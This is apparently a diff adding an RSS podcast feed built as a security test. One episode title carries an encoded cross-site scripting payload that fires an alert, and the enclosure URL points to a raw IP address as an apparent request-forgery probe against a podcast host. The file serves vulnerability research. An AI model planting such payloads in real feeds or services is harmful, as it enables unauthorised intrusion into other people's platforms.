@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<channel>
+<title>XSS Isolation Test</title>
+<description>Security research feed</description>
+<link>https://example.com/podcast</link>
+<language>en-us</language>
+<itunes:author>Kiki Maulana</itunes:author>
+<item>
+<title>&lt;img src=x onerror=alert(4)&gt;</title>
+<description>Clean description here</description>
+<guid>https://github.com/kikiemz/spreaker-ssrf-test/xss-iso1</guid>
+<pubDate>Thu, 06 Nov 2026 02:45:00 GMT</pubDate>
+<enclosure url="http://129.226.203.245/episode.mp3" length="1024" type="audio/mpeg"/>
+</item>
+</channel>
+</rss>
